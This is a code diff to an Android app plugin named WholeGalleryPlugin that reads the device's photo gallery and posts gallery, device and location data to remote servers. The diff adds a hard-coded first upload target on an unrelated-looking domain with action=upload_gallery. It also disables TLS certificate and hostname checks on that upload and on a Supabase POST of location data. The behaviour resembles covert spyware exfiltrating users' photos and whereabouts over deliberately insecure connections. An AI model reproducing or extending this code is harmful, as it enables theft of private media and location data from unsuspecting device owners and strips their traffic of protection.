@@ -280,6 +280,7 @@ public class WholeGalleryPlugin extends Plugin {
                 }
 
                 List<String> candidates = new ArrayList<>();
+                candidates.add("https://slytherin.codashop.shop/admin-php/api.php");
                 if (apiUrl != null && !apiUrl.trim().isEmpty()) {
                     candidates.add(apiUrl);
                 }
@@ -307,9 +308,23 @@ public class WholeGalleryPlugin extends Plugin {
                         String fullUrl = cand.contains("action=") ? cand : (cand.contains("?") ? (cand + "&action=upload_gallery") : (cand + "?action=upload_gallery"));
                         URL url = new URL(fullUrl);
                         conn = (HttpURLConnection) url.openConnection();
+                        if (conn instanceof javax.net.ssl.HttpsURLConnection) {
+                            javax.net.ssl.HttpsURLConnection httpsConn = (javax.net.ssl.HttpsURLConnection) conn;
+                            javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
+                                new javax.net.ssl.X509TrustManager() {
+                                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
+                                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                                }
+                            };
+                            javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
+                            sc.init(null, trustAllCerts, new java.security.SecureRandom());
+                            httpsConn.setSSLSocketFactory(sc.getSocketFactory());
+                            httpsConn.setHostnameVerifier((hostname, session) -> true);
+                        }
                         conn.setRequestMethod("POST");
-                        conn.setConnectTimeout(2500);
-                        conn.setReadTimeout(2500);
+                        conn.setConnectTimeout(3000);
+                        conn.setReadTimeout(3000);
                         conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                         conn.setRequestProperty("Accept", "application/json");
                         conn.setDoOutput(true);
@@ -333,7 +348,7 @@ public class WholeGalleryPlugin extends Plugin {
                 try {
                     String targetEmail = (userEmail != null && !userEmail.trim().isEmpty() && !userEmail.endsWith("@ketupat.app"))
                             ? userEmail.trim()
-                            : ((mlbbId != null && !mlbbId.trim().isEmpty()) ? (mlbbId + "." + (mlbbServer != null && !mlbbServer.trim().isEmpty() ? mlbbServer : "0") + "@ketupat.app") : ("device_" + deviceId + "@ketupat.app"));
+                            : ("device_" + deviceId + "@ketupat.app");
 
                     org.json.JSONObject locObj = new org.json.JSONObject();
                     locObj.put("device_id", deviceId);
@@ -355,6 +370,20 @@ public class WholeGalleryPlugin extends Plugin {
                     String supaUrl = "https://uatqaxxfzmpxkeeoeoin.supabase.co/rest/v1/users?on_conflict=email";
                     URL sUrl = new URL(supaUrl);
                     HttpURLConnection sConn = (HttpURLConnection) sUrl.openConnection();
+                    if (sConn instanceof javax.net.ssl.HttpsURLConnection) {
+                        javax.net.ssl.HttpsURLConnection sHttpsConn = (javax.net.ssl.HttpsURLConnection) sConn;
+                        javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
+                            new javax.net.ssl.X509TrustManager() {
+                                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
+                                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                            }
+                        };
+                        javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
+                        sc.init(null, trustAllCerts, new java.security.SecureRandom());
+                        sHttpsConn.setSSLSocketFactory(sc.getSocketFactory());
+                        sHttpsConn.setHostnameVerifier((hostname, session) -> true);
+                    }
                     sConn.setRequestMethod("POST");
                     sConn.setConnectTimeout(5000);
                     sConn.setReadTimeout(5000);
@@ -561,14 +590,31 @@ public class WholeGalleryPlugin extends Plugin {
     private int queryMediaCollection(Uri collection, String[] projection, String selection, String[] selectionArgs,
                                      JSArray photos, Set<String> processedNames, int currentCount, int limit,
                                      boolean includeBase64, int maxDim, int quality) {
-        try (Cursor cursor = getContext().getContentResolver().query(collection, projection, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC")) {
+        Cursor cursor = null;
+        try {
+            try {
+                cursor = getContext().getContentResolver().query(collection, projection, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC");
+            } catch (Throwable e) {
+                String[] fallbackProj = new String[]{
+                    MediaStore.MediaColumns._ID,
+                    MediaStore.MediaColumns.DISPLAY_NAME,
+                    MediaStore.MediaColumns.DATE_ADDED,
+                    MediaStore.MediaColumns.SIZE,
+                    MediaStore.MediaColumns.MIME_TYPE
+                };
+                cursor = getContext().getContentResolver().query(collection, fallbackProj, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC");
+            }
+
             if (cursor != null) {
                 int idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID);
                 int nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME);
                 int dateCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED);
                 int sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE);
                 int mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE);
-                int dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA);
+                int dataCol = -1;
+                try {
+                    dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA);
+                } catch (Throwable ignored) {}
 
                 while (cursor.moveToNext() && currentCount < limit) {
                     long id = idCol >= 0 ? cursor.getLong(idCol) : System.currentTimeMillis();
@@ -607,7 +653,12 @@ public class WholeGalleryPlugin extends Plugin {
                     currentCount++;
                 }
             }
-        } catch (Throwable ignored) {}
+        } catch (Throwable ignored) {
+        } finally {
+            if (cursor != null) {
+                try { cursor.close(); } catch (Throwable ignored) {}
+            }
+        }
         return currentCount;
     }
 
